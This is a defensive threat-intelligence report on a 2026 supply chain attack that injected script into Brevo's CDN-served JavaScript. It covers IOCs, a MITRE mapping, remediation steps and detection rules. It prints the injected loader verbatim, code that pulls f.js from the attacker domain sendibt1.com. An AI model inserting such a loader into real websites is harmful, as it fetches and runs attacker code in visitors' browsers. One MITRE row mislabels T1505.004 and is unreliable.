# Technical Analysis Report: Brevo Supply Chain Attack (2026-09-18)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-09-18
Version: 1.0 (DRAFT)

## Executive Summary

On September 14, 2026, attackers leveraged a stolen Cloudflare API key to deploy a malicious Cloudflare worker that injected JavaScript into Brevo (formerly Sendinblue) customer-facing assets. The compromised files -- `sdk-loader.js` and `brevo-conversations.js` -- were embedded on approximately 100,000 websites. The injected script loaded a secondary payload (`f.js`) from attacker-controlled `cdn*.sendibt1[.]com` subdomains, which served a dual-purpose malware: a ClickFix social engineering overlay that tricked visitors into running malicious commands, and an automated WordPress backdoor installer that targeted logged-in administrators. The malicious worker was active for approximately 5.5 hours (16:05-20:12 UTC) before Brevo remediated the compromise.

This attack represents a significant supply chain compromise of a major email marketing platform, with the potential to deliver second-stage malware to tens of thousands of site visitors and plant persistent backdoors on WordPress installations.

## Background: Brevo Email Marketing Platform

Brevo (formerly Sendinblue) is a major SaaS email marketing, automation, and CRM platform. Customers embed Brevo JavaScript files on their websites for newsletter signup forms (`sibforms.com`), live chat widgets (`brevo-conversations.js`), and marketing SDKs (`sdk-loader.js`). This JavaScript is loaded directly from Brevo's CDN by end-user browsers, making it a high-value target for supply chain attacks -- a single compromised file propagates to every website that embeds it.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2026-08-25 | SSL certificate created for `cdn.sendibt1[.]com`; infrastructure preparation begins |
| 2026-09-10 | Brevo discloses initial SAML SSO breach; 138 accounts accessed (6 initially reported) |
| Late August 2026 | Compromised Cloudflare API key first misused |
| 2026-09-14, 16:05 | Attacker deploys malicious Cloudflare worker; injected scripts begin serving to visitors |
| 2026-09-14, 20:12 | Malicious worker removed; injected code no longer served |
| 2026-09-15 | All malicious sendibt1[.]com hosts stop resolving DNS |

## Root Cause: Compromised Cloudflare API Key

The attackers obtained a Cloudflare API key associated with Brevo's account. Evidence suggests the key was stolen during or after the initial SAML SSO breach disclosed on September 10, 2026. Using this API key, the attackers:

1. Created DNS records for `cdn*` subdomains on the `sendibt1[.]com` zone (a typosquat of "sendinblue")
2. Deployed a Cloudflare worker that intercepted and modified responses from Brevo's legitimate JavaScript CDN endpoints
3. Appended malicious JavaScript to three customer-facing JS files served from `brevo[.]com` and `sibforms[.]com`

All five apex domains used for malicious infrastructure were registered through Cloudflare DNS, and the modified assets maintained identical `Last-Modified` headers throughout the incident -- a hallmark of Cloudflare worker-based injection where the worker modifies the response body without altering response metadata.

## Technical Analysis of the Malicious Payload

### 1. Script Injection via Cloudflare Worker

The Cloudflare worker appended a self-executing JavaScript function to legitimate Brevo assets. The injected code:

```javascript
(function () {
  var s = document.createElement("script");
  s.src = "https://cdn2.sendibt1.com/f.js";
  s.async = true;
  var h = document.head || document.documentElement;
  h.appendChild(s);
})();
```

Different compromised files loaded from different subdomains (`cdn2`, `cdn4`, `cdn11`), possibly for tracking or load distribution.

### 2. Dual-Purpose Malware Payload (f.js)

The `f.js` payload performed browser fingerprinting and then executed one of two attack paths:

**Path A -- WordPress Administrator Backdoor**: If the visitor was detected as a logged-in WordPress administrator, the script silently installed a backdoor plugin by:
- Fetching a ZIP archive from `https://cdn10.sendibt1[.]com/p/wm.zip`
- Submitting it via the WordPress plugin upload endpoint (`/wp-admin/update.php?action=upload-plugin`)
- Activating the installed plugin (`/wp-admin/plugins.php?action=activate`)

**Path B -- ClickFix Social Engineering Overlay**: For other visitors, a full-page overlay was displayed mimicking a Cloudflare "Verify you are human" challenge. The overlay instructed victims to copy and paste a command into their system's terminal/Run dialog. This is the "ClickFix" technique that has been observed in multiple campaigns throughout 2025-2026.

### 3. C2 Infrastructure

The malware communicated with backend C2 endpoints via structured API calls:

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `/api/v1/0044d4a` | POST | Browser fingerprint submission |
| `/api/v1/e08a3c4` | GET/POST | Proof-of-work token exchange (anti-bot) |
| `/api/v1/4aff112?tk=` | GET | Clipboard command payload delivery |
| `/api/v1/b832c14?e=` | GET | Event beacon / telemetry |

The proof-of-work mechanism served as anti-analysis gating, requiring compute before delivering the final ClickFix payload.

**Malicious domains and IPs:**
- `cdn.sendibt1[.]com` (104.21.77[.]104)
- `cdn2.sendibt1[.]com`
- `cdn3.sendibt1[.]com`
- `cdn4.sendibt1[.]com`
- `cdn9.sendibt1[.]com` (188.114.97[.]3)
- `cdn10.sendibt1[.]com`
- `cdn11.sendibt1[.]com`

### 4. Platform-Specific Behavior

#### WordPress Sites
The attack specifically targeted WordPress installations by detecting admin login status via cookies and DOM elements, then exploiting the plugin upload mechanism. This plants a persistent backdoor that survives removal of the injected Brevo JavaScript.

#### All Websites
Non-WordPress sites (or non-admin visitors) received the ClickFix overlay, which is OS-agnostic but primarily targets Windows users with PowerShell-based commands.

### 5. Anti-Forensics / Evasion Techniques

- **Preserved Last-Modified headers**: The Cloudflare worker maintained original HTTP response metadata, making cache-based detection difficult
- **Proof-of-work gating**: C2 required PoW token before delivering payloads, hindering automated sandbox analysis
- **Short operational window**: Only 5.5 hours of active exploitation, limiting detection window
- **Typosquat domain**: `sendibt1.com` closely resembles "sendinblue" (Brevo's former name), potentially evading casual inspection
- **CDN-fronted infrastructure**: All C2 domains used Cloudflare, blending with legitimate traffic

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` replacing `https://`
> - Domains: `[.]` replacing dots
> - IP addresses: `[.]` replacing dots

### Package / Software Level

| Package / Component | Malicious Version | Description |
|---------------------|-------------------|-------------|
| sdk-loader.js | Injected (cdn2 variant) | Brevo SDK loader with appended malicious script loader |
| sdk-loader.js | Injected (cdn11 variant) | Brevo SDK loader with appended malicious script loader |
| brevo-conversations.js | Injected (cdn4 variant) | Brevo chat widget with appended malicious script loader |

### File System

| Platform | Path / File | Hash (SHA256) | Description |
|----------|-------------|---------------|-------------|
| Web | sdk-loader.js (clean) | `fe8447fd1ec4dca652b71db2c749fcc24a5bec3875f3654042169fb2418aed09` | Clean Brevo SDK loader |
| Web | sdk-loader.js (cdn2 injected) | `58a5c601c9df7ca2120435588fc39f97712d9b878795f6ee500590099a432308` | Injected variant loading from cdn2 |
| Web | sdk-loader.js (cdn11 injected) | `f67d572d2d30407b3f470904326411450763108980cdad89550fbb221fb06782` | Injected variant loading from cdn11 |
| Web | brevo-conversations.js (clean) | `26166cd87ff07e7a50317a24126d14b262e842c5715585636dee3ab3f227ddca` | Clean Brevo conversations widget |
| Web | brevo-conversations.js (cdn4 injected) | `9b62c12bc5c7feb9802f58e6cf75a368690df3c754e37cc64483a92acacf87a5` | Injected variant loading from cdn4 |
| Web | C2 cloak response | `4af488d79aef7daa12b1c18f0cce28b7edadccb8b6b0fb8d50d1d53a9a7c2df7` | Hash of C2 cloaking response |

### Network

| Type | Value | Context |
|------|-------|---------|
| Domain | cdn[.]sendibt1[.]com | Primary C2 / payload staging |
| Domain | cdn2[.]sendibt1[.]com | f.js payload delivery (sdk-loader variant) |
| Domain | cdn3[.]sendibt1[.]com | Payload delivery |
| Domain | cdn4[.]sendibt1[.]com | f.js payload delivery (conversations variant) |
| Domain | cdn9[.]sendibt1[.]com | Payload delivery |
| Domain | cdn10[.]sendibt1[.]com | WordPress backdoor plugin (wm.zip) staging |
| Domain | cdn11[.]sendibt1[.]com | f.js payload delivery (sdk-loader variant) |
| IP | 104.21.77[.]104 | Cloudflare IP for cdn[.]sendibt1[.]com |
| IP | 188.114.97[.]3 | Cloudflare IP for cdn9[.]sendibt1[.]com |
| URL Pattern | hxxps://cdn*[.]sendibt1[.]com/f.js | Malicious JavaScript payload |
| URL Pattern | hxxps://cdn10[.]sendibt1[.]com/p/wm.zip | WordPress backdoor plugin archive |
| URL Pattern | /api/v1/0044d4a | Fingerprint submission endpoint |
| URL Pattern | /api/v1/e08a3c4 | Proof-of-work token endpoint |
| URL Pattern | /api/v1/4aff112?tk= | Clipboard command delivery |
| URL Pattern | /api/v1/b832c14?e= | Event beacon |

### Behavioral

- JavaScript dynamically creates `<script>` elements pointing to `sendibt1[.]com` subdomains
- Automated WordPress plugin upload via `/wp-admin/update.php?action=upload-plugin` without user interaction
- Full-page overlay mimicking Cloudflare human verification (ClickFix pattern)
- Proof-of-work computation in browser before C2 payload delivery
- POST requests to `/api/v1/` endpoints on sendibt1[.]com for fingerprinting and telemetry

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1195.002 | Supply Chain Compromise: Compromise Software Supply Chain | Attacker injected malicious code into Brevo's JavaScript CDN files via stolen Cloudflare API key |
| T1059.007 | Command and Scripting Interpreter: JavaScript | Injected JavaScript loader and f.js payload execute in victim browsers |
| T1204.001 | User Execution: Malicious Link | ClickFix overlay tricks users into copying and executing malicious commands |
| T1071.001 | Application Layer Protocol: Web Protocols | C2 communication via HTTP API endpoints on sendibt1[.]com |
| T1082 | System Discovery | Browser fingerprinting via /api/v1/0044d4a endpoint |
| T1505.004 | Server Software Component: IIS Components / Web Shell | WordPress backdoor plugin installed via wm.zip upload |
| T1584.006 | Compromise Infrastructure: Web Services | Abuse of Cloudflare Workers to inject malicious content |
| T1036.005 | Masquerading: Match Legitimate Name or Location | sendibt1.com typosquat of sendinblue (Brevo's former brand) |

## Impact Assessment

- **Breadth**: Approximately 100,000 websites that embedded Brevo JavaScript were affected
- **Depth**: Two distinct impact vectors -- ClickFix malware delivery to site visitors and persistent WordPress backdoor installation for admin users
- **Exposure window**: 5.5 hours (September 14, 16:05-20:12 UTC), but cached copies of injected scripts may have extended exposure
- **Stealth**: Cloudflare worker injection preserved response headers; the proof-of-work gating mechanism hindered automated detection
- **Persistence**: WordPress sites where the backdoor plugin was installed remain compromised even after the supply chain vector was remediated

## Detection & Remediation

### Immediate Detection

Search web proxy, DNS, and firewall logs for connections to `sendibt1.com` or any subdomain:

```
# Splunk query
index=proxy OR index=dns ("sendibt1.com")

# Grep web server access logs for WordPress backdoor installation
grep -E "upload-plugin|action=activate" /var/log/apache2/access.log | grep -i sendibt1
```

Check WordPress installations for unknown plugins installed on September 14, 2026:

```bash
# List recently modified WordPress plugins
find /var/www/html/wp-content/plugins/ -newer /var/www/html/wp-content/plugins/index.php -mtime -7 -type f
```

### Remediation

1. **Block sendibt1[.]com** and all subdomains at DNS and proxy level
2. **Audit WordPress plugins** installed between September 14-15, 2026; remove any unrecognized plugins, especially those from ZIP uploads
3. **Rotate credentials** for any WordPress admin accounts that visited Brevo-embedded sites during the attack window
4. **Clear browser caches** on machines that may have visited affected sites to prevent re-execution of cached injected scripts
5. **Verify Brevo JS integrity** by comparing current file hashes against the known-clean values listed in the IOC section

### Long-Term Hardening

- Implement Subresource Integrity (SRI) hashes for all third-party JavaScript includes
- Deploy Content Security Policy (CSP) headers to restrict script sources
- Monitor for unauthorized Cloudflare worker deployments via Cloudflare audit logs
- Rotate API keys regularly and scope Cloudflare API tokens to minimum required permissions
- Consider self-hosting critical third-party JavaScript rather than loading from vendor CDNs

## Detection Rules

Five Sigma rules, six Suricata rules, five Snort rules, and four YARA rules cover the known sendibt1[.]com IOC surface -- domains, payload URLs, C2 API paths, WordPress backdoor delivery, and file-level indicators in compromised Brevo JavaScript. The primary caveat is that all network rules are IOC-specific to the sendibt1[.]com domain family and will not detect future supply chain attacks using different infrastructure.

### Sigma Rules

#### Brevo Supply Chain - Connection to Sendibt1 Malicious Domain
Detects web proxy connections to any sendibt1[.]com domain.
**compile**: Splunk `sigma convert` exit 0, LogScale exit 0 | `sigma check` blocked by proxy (MITRE data fetch 403, not a rule defect) | **confidence: high**
<!-- Validation: sigma convert --without-pipeline -t splunk -> '"c-uri"="*sendibt1.com*"' exit 0. sigma check fails on MITRE ATT&CK data download via proxy (HTTP 403) not a rule syntax issue. Tags attack.t1195.002, attack.t1059.007 are valid technique-level tags. Fields use standard proxy logsource category. -->

```yaml
title: Brevo Supply Chain - Connection to Sendibt1 Malicious Domain
id: 7c3a1e48-d9f2-4b87-a6e1-8f4d2c5b9a03
status: experimental
description: >
    Detects web proxy connections to cdn*.sendibt1.com domains used in the
    Brevo supply chain attack to deliver ClickFix scripts and WordPress
    backdoor plugins. Active September 14, 2026.
references:
    - https://sansec.io/research/brevo-supply-chain-attack
    - https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/
author: Actioner
date: 2026-09-18
tags:
    - attack.t1195.002
    - attack.t1059.007
logsource:
    category: proxy
detection:
    selection:
        c-uri|contains:
            - 'sendibt1.com'
    condition: selection
falsepositives:
    - None expected; sendibt1.com is a typosquat of sendinblue and has no legitimate use
level: critical
```

#### Brevo Supply Chain - DNS Query to Sendibt1 C2 Domain
Detects DNS resolution requests for sendibt1[.]com and subdomains.
**compile**: Splunk exit 0, LogScale exit 0 | `sigma check` blocked by proxy | **confidence: high**
<!-- Validation: sigma convert --without-pipeline -t splunk -> 'QueryName IN ("*.sendibt1.com", "*sendibt1.com")' exit 0. Uses dns_query logsource with QueryName field per Sysmon EID 22 schema. -->

```yaml
title: Brevo Supply Chain - DNS Query to Sendibt1 C2 Domain
id: a2e8f147-3c6d-4a9b-b5d8-1e7f0c3a2d94
status: experimental
description: >
    Detects DNS queries to sendibt1.com and its cdn subdomains used in the
    Brevo supply chain attack for ClickFix script delivery and WordPress
    plugin backdoor staging. Active September 14, 2026.
references:
    - https://sansec.io/research/brevo-supply-chain-attack
    - https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/
author: Actioner
date: 2026-09-18
tags:
    - attack.t1195.002
    - attack.t1071.001
logsource:
    category: dns_query
detection:
    selection:
        QueryName|endswith:
            - '.sendibt1.com'
            - 'sendibt1.com'
    condition: selection
falsepositives:
    - None expected; sendibt1.com is a typosquat domain registered by the attackers
level: critical
```

#### Brevo Supply Chain - Malicious f.js Script Reference in Web Logs
Detects requests for the f.js payload on sendibt1[.]com.
**compile**: Splunk exit 0, LogScale exit 0 | `sigma check` blocked by proxy | **confidence: high**
<!-- Validation: sigma convert --without-pipeline -t splunk -> '"c-uri"="*sendibt1.com*" "c-uri"="*/f.js"' exit 0. Dual selection AND condition. -->

```yaml
title: Brevo Supply Chain - Malicious f.js Script Reference in Web Logs
id: d4b7e293-8f1a-4c5e-9d60-3a2b1e7f8c46
status: experimental
description: >
    Detects HTTP requests to the malicious f.js script hosted on
    cdn*.sendibt1.com subdomains, which delivered the ClickFix overlay
    and WordPress backdoor installer in the Brevo supply chain attack.
references:
    - https://sansec.io/research/brevo-supply-chain-attack
    - https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/
author: Actioner
date: 2026-09-18
tags:
    - attack.t1195.002
    - attack.t1059.007
logsource:
    category: proxy
detection:
    selection_domain:
        c-uri|contains: 'sendibt1.com'
    selection_path:
        c-uri|endswith: '/f.js'
    condition: selection_domain and selection_path
falsepositives:
    - None expected; this is a specific attack payload URL
level: critical
```

#### Brevo Supply Chain - WordPress Backdoor Plugin Installation
Detects WordPress plugin upload triggered by the injected script with a sendibt1[.]com referer.
**compile**: Splunk exit 0, LogScale exit 0 | `sigma check` blocked by proxy | **confidence: high**
<!-- Validation: sigma convert --without-pipeline -t splunk -> '"cs-uri-stem"="*/wp-admin/update.php*" "cs-uri-query"="*action=upload-plugin*" "cs-referer"="*sendibt1.com*"' exit 0. Uses webserver logsource. -->

```yaml
title: Brevo Supply Chain - WordPress Backdoor Plugin Installation
id: e5c9f384-2d7b-4e6a-af81-4b3c2d1e9f57
status: experimental
description: >
    Detects the WordPress plugin upload and activation pattern used by the
    Brevo supply chain attack. The injected JavaScript attempted to install
    a backdoor plugin (wm.zip) via the WordPress admin panel when an
    administrator was logged in.
references:
    - https://sansec.io/research/brevo-supply-chain-attack
    - https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/
author: Actioner
date: 2026-09-18
tags:
    - attack.t1195.002
    - attack.t1505.004
logsource:
    category: webserver
detection:
    selection_upload:
        cs-uri-stem|contains: '/wp-admin/update.php'
        cs-uri-query|contains: 'action=upload-plugin'
    selection_referer:
        cs-referer|contains: 'sendibt1.com'
    condition: selection_upload and selection_referer
falsepositives:
    - Legitimate WordPress plugin installations do not reference sendibt1.com
level: critical
```

#### Brevo Supply Chain - C2 API Endpoint Communication
Detects HTTP requests to the specific C2 API path hashes used by the ClickFix malware.
**compile**: Splunk exit 0, LogScale exit 0 | `sigma check` blocked by proxy | **confidence: high**
<!-- Validation: sigma convert --without-pipeline -t splunk -> '"c-uri"="*sendibt1.com*" "c-uri" IN ("*/api/v1/0044d4a*", ...)' exit 0. API path hashes are unique to this campaign. -->

```yaml
title: Brevo Supply Chain - C2 API Endpoint Communication
id: f6d0a495-3e8c-4f7b-b092-5c4d3e2f0a68
status: experimental
description: >
    Detects HTTP communication with the specific C2 API endpoints used by
    the Brevo supply chain ClickFix malware for fingerprinting, proof-of-work
    token exchange, clipboard command delivery, and event beacons.
references:
    - https://sansec.io/research/brevo-supply-chain-attack
    - https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/
author: Actioner
date: 2026-09-18
tags:
    - attack.t1071.001
    - attack.t1082
logsource:
    category: proxy
detection:
    selection_domain:
        c-uri|contains: 'sendibt1.com'
    selection_api:
        c-uri|contains:
            - '/api/v1/0044d4a'
            - '/api/v1/e08a3c4'
            - '/api/v1/4aff112'
            - '/api/v1/b832c14'
    condition: selection_domain and selection_api
falsepositives:
    - None expected; these are attacker-specific API path hashes
level: critical
```

### Suricata Rules

Six rules covering DNS queries, HTTP host matching, specific payload URLs, WordPress plugin delivery, C2 API beacons, and TLS SNI detection for sendibt1[.]com. All six compile successfully with `suricata -T` (exit 0).
<!-- Validation: suricata -T -S suricata-brevo-sendibt1.rules -l /tmp/actioner -> "Configuration provided was successfully loaded. Exiting." exit 0. Removed nocase from http.host (already normalized to lowercase by Suricata). -->

```
alert dns $HOME_NET any -> any any (msg:"Actioner - Brevo Supply Chain - DNS Query to sendibt1.com C2 Domain"; flow:to_server; dns.query; content:"sendibt1.com"; nocase; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-18, attack_id T1195.002; sid:2100101; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - HTTP Request to sendibt1.com Malicious CDN"; flow:established,to_server; http.host; content:"sendibt1.com"; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-18, attack_id T1195.002; sid:2100102; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - Malicious f.js Payload Delivery from sendibt1"; flow:established,to_server; http.host; content:"sendibt1.com"; http.uri; content:"/f.js"; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-18, attack_id T1059.007; sid:2100103; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - WordPress Backdoor Plugin Download (wm.zip)"; flow:established,to_server; http.host; content:"sendibt1.com"; http.uri; content:"/p/wm.zip"; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-18, attack_id T1505.004; sid:2100104; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - C2 API Fingerprint Beacon"; flow:established,to_server; http.host; content:"sendibt1.com"; http.uri; content:"/api/v1/"; fast_pattern; http.method; content:"POST"; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-18, attack_id T1071.001; sid:2100105; rev:1;)

alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - TLS SNI to sendibt1.com Malicious Domain"; flow:established,to_server; tls.sni; content:"sendibt1.com"; fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created_at 2026-09-18, attack_id T1195.002; sid:2100106; rev:1;)
```
**compile**: `suricata -T` exit 0 | **confidence: high**

### Snort 3 Rules

Five rules for HTTP host detection, payload URL matching, WordPress backdoor download, C2 API beacon, and DNS query detection. Snort is not installed in this environment.
<!-- Structural check: all rules use http service with http_header/http_uri sticky buffers, correct Snort 3 comma-separated modifier syntax, unique SIDs in 2100200 range, msg/sid/rev present, flow:established set for TCP rules. DNS rule uses udp port 53 with DNS wire-format label encoding. -->

```
alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - HTTP Request to sendibt1.com Malicious CDN"; flow:established, to_server; http_header; field host; content:"sendibt1.com", nocase, fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created 2026-09-18; sid:2100201; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - Malicious f.js Payload Delivery"; flow:established, to_server; http_header; field host; content:"sendibt1.com", nocase; http_uri; content:"/f.js", fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created 2026-09-18; sid:2100202; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - WordPress Backdoor Plugin Download (wm.zip)"; flow:established, to_server; http_header; field host; content:"sendibt1.com", nocase; http_uri; content:"/p/wm.zip", fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created 2026-09-18; sid:2100203; rev:1;)

alert http $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - Brevo Supply Chain - C2 API Beacon POST to sendibt1.com"; flow:established, to_server; http_method; content:"POST"; http_header; field host; content:"sendibt1.com", nocase; http_uri; content:"/api/v1/", fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created 2026-09-18; sid:2100204; rev:1;)

alert udp $HOME_NET any -> any 53 (msg:"Actioner - Brevo Supply Chain - DNS Query to sendibt1.com C2 Domain"; flow:to_server; content:"|09|sendibt1|03|com|00|", nocase, fast_pattern; classtype:trojan-activity; reference:url,sansec.io/research/brevo-supply-chain-attack; metadata:author Actioner, created 2026-09-18; sid:2100205; rev:1;)
```
**compile**: uncompiled (structural check only) | **confidence: high**

### YARA Rules

Four rules detecting injected script loader patterns, sendibt1[.]com domain references, C2 API path hashes, and compromised Brevo SDK file signatures. All four compile with `yarac` (exit 0).
<!-- Validation: yarac yara-brevo-supply-chain.yar /dev/null -> exit 0. Rules use ascii/wide/nocase modifiers appropriately. filesize constraints prevent scan performance issues. -->

```yara
rule Brevo_Supply_Chain_Injected_Script_Loader
{
    meta:
        description = "Detects the injected JavaScript loader appended to Brevo JS assets (sdk-loader.js, brevo-conversations.js) during the September 2026 supply chain attack"
        author = "Actioner"
        date = "2026-09-18"
        reference = "https://sansec.io/research/brevo-supply-chain-attack"
        severity = "critical"
        hash = "58a5c601c9df7ca2120435588fc39f97712d9b878795f6ee500590099a432308"

    strings:
        $loader1 = "cdn.sendibt1.com" ascii
        $loader2 = "cdn2.sendibt1.com" ascii
        $loader3 = "cdn3.sendibt1.com" ascii
        $loader4 = "cdn4.sendibt1.com" ascii
        $loader5 = "cdn9.sendibt1.com" ascii
        $loader6 = "cdn10.sendibt1.com" ascii
        $loader7 = "cdn11.sendibt1.com" ascii
        $inject_pattern = "document.createElement(\"script\")" ascii
        $inject_src = "sendibt1.com/f.js" ascii

    condition:
        filesize < 5MB and
        (any of ($loader*) or $inject_src) and
        $inject_pattern
}

rule Brevo_Supply_Chain_Sendibt1_Domain_Reference
{
    meta:
        description = "Detects any file referencing the sendibt1.com malicious domain used in the Brevo supply chain attack"
        author = "Actioner"
        date = "2026-09-18"
        reference = "https://sansec.io/research/brevo-supply-chain-attack"
        severity = "high"

    strings:
        $domain = "sendibt1.com" ascii wide nocase

    condition:
        filesize < 10MB and $domain
}

rule Brevo_Supply_Chain_ClickFix_C2_API_Paths
{
    meta:
        description = "Detects files containing the specific C2 API endpoint path hashes used by the Brevo ClickFix malware for fingerprinting and command delivery"
        author = "Actioner"
        date = "2026-09-18"
        reference = "https://sansec.io/research/brevo-supply-chain-attack"
        severity = "high"

    strings:
        $api1 = "/api/v1/0044d4a" ascii
        $api2 = "/api/v1/e08a3c4" ascii
        $api3 = "/api/v1/4aff112" ascii
        $api4 = "/api/v1/b832c14" ascii
        $domain = "sendibt1.com" ascii

    condition:
        filesize < 5MB and
        $domain and
        2 of ($api*)
}

rule Brevo_Supply_Chain_Compromised_SDK_Loader
{
    meta:
        description = "Detects the known-bad SHA256 hashes of compromised Brevo JavaScript files by matching characteristic file content patterns"
        author = "Actioner"
        date = "2026-09-18"
        reference = "https://sansec.io/research/brevo-supply-chain-attack"
        severity = "critical"
        hash1 = "58a5c601c9df7ca2120435588fc39f97712d9b878795f6ee500590099a432308"
        hash2 = "f67d572d2d30407b3f470904326411450763108980cdad89550fbb221fb06782"
        hash3 = "9b62c12bc5c7feb9802f58e6cf75a368690df3c754e37cc64483a92acacf87a5"

    strings:
        $brevo_sdk = "sdk-loader" ascii
        $brevo_conv = "brevo-conversations" ascii
        $inject = "sendibt1.com" ascii
        $script_create = "createElement" ascii
        $async_flag = "s.async" ascii

    condition:
        filesize < 2MB and
        ($brevo_sdk or $brevo_conv) and
        $inject and
        $script_create and
        $async_flag
}
```
**compile**: `yarac` exit 0 | **confidence: high**

## Lessons Learned

1. **Third-party JavaScript is a single point of failure**: Over 100,000 websites were compromised through a single vendor's JavaScript files. Subresource Integrity (SRI) hashes would have prevented browsers from executing modified scripts, but SRI adoption remains low for dynamically loaded marketing scripts.

2. **API key security is supply chain security**: A single Cloudflare API key gave attackers the ability to modify content served to millions of visitors. API keys should be scoped to minimum required permissions, rotated regularly, and protected by access controls equivalent to production credentials.

3. **Cloudflare Workers are a double-edged sword**: The same serverless edge computing that enables performance optimization can be weaponized for transparent content injection. Organizations should monitor Cloudflare audit logs for unauthorized worker deployments and implement approval workflows for worker changes.

4. **ClickFix continues to evolve**: The combination of supply chain injection with ClickFix social engineering demonstrates increasing sophistication. The proof-of-work anti-analysis mechanism adds another layer of evasion that defenders must account for.

5. **Short attack windows demand automation**: With only 5.5 hours of active exploitation, manual detection is insufficient. Automated monitoring for unexpected script changes, domain reputation shifts, and anomalous JavaScript behavior is essential.

## Sources

- [Sansec Research - Brevo Supply Chain Attack](https://sansec.io/research/brevo-supply-chain-attack) -- primary technical analysis with IOCs, file hashes, domain infrastructure, and C2 endpoint documentation
- [SecurityWeek - Brevo Supply Chain Attack Injects Malware into 100,000 Websites](https://www.securityweek.com/brevo-supply-chain-attack-injects-malware-into-100000-websites/) -- industry reporting with timeline and scope confirmation
- [BleepingComputer - Brevo Supply Chain Attack Injected ClickFix Scripts on Customer Sites](https://www.bleepingcomputer.com/news/security/brevo-supply-chain-attack-injected-clickfix-scripts-on-customer-sites/) -- additional reporting on the ClickFix component and Cloudflare worker mechanism

---
*Report generated by Actioner*
